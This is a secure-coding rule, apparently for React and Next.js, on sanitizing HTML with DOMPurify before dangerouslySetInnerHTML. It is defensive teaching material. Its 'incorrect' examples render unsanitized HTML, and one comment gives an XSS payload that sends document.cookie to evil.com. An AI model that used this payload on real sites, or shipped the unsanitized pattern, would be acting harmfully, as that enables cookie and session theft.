---
title: Sanitize All HTML Before Using dangerouslySetInnerHTML
description: "dangerouslySetInnerHTML bypasses React's XSS protection. Always sanitize HTML from external sources with DOMPurify before rendering."
impact: CRITICAL
impact_description: prevents cross-site scripting (XSS) attacks
tags: [security, xss, sanitization, react, nextjs]
cwe: ["CWE-79"]
owasp: ["A03:2021"]
detection_grep: "dangerouslySetInnerHTML"
---

## Sanitize All HTML Before Using dangerouslySetInnerHTML

**Impact: CRITICAL (prevents cross-site scripting attacks)**

React escapes content by default, but `dangerouslySetInnerHTML` bypasses this protection entirely. If the HTML comes from user input, a database, a CMS, or any external source, it must be sanitized before rendering. Unsanitized HTML enables attackers to inject scripts that steal cookies, session tokens, or perform actions as the user.

**Incorrect (rendering unsanitized external HTML):**

```tsx
// ❌ CMS content rendered without sanitization
export function BlogPost({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />
}

// ❌ User-generated content rendered raw
export function Comment({ body }: { body: string }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />
  // If body = '<img src=x onerror="document.location=`https://evil.com?c=${document.cookie}`">'
  // ...the attacker now has the user's cookies
}

// ❌ Markdown-to-HTML without sanitization
import { marked } from 'marked'
export function MarkdownPreview({ markdown }: { markdown: string }) {
  const html = marked(markdown)
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

**Correct (sanitize before rendering):**

```tsx
// ✅ Sanitize with DOMPurify (most popular, well-maintained)
import DOMPurify from 'isomorphic-dompurify'

export function BlogPost({ content }: { content: string }) {
  const clean = DOMPurify.sanitize(content)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ✅ Sanitize markdown output
import { marked } from 'marked'
import DOMPurify from 'isomorphic-dompurify'

export function MarkdownPreview({ markdown }: { markdown: string }) {
  const rawHtml = marked(markdown)
  const clean = DOMPurify.sanitize(rawHtml)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ✅ Best: use a React markdown renderer that doesn't use dangerouslySetInnerHTML
import ReactMarkdown from 'react-markdown'

export function MarkdownPreview({ markdown }: { markdown: string }) {
  return <ReactMarkdown>{markdown}</ReactMarkdown>
}
```

**Detection hints:**

```bash
# Find all uses of dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
# Check if DOMPurify or sanitize is imported nearby
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" -l | \
  xargs grep -L "DOMPurify\|sanitize\|purify"
```

Reference: [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) · [DOMPurify](https://github.com/cure53/DOMPurify)
